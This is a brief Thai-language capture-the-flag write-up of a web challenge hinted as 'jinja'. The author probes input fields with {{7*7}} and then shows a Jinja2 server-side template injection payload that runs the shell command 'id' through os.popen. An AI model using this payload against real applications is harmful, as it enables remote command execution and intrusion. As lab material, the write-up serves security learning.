
vacine web application

ชื่อใบ้มาว่า jinja

jinja คือ template engine บน python ใช้แสดง หน้าเว็บแบบ dynamic ตาม user input

![alt text](image-3.png)

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

ผมเลยใส่ {{7*7}} ทุก input feild


![alt text](image.png)


![alt text](image-1.png)


https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```


![alt text](image-2.png)

![alt text](image-4.png)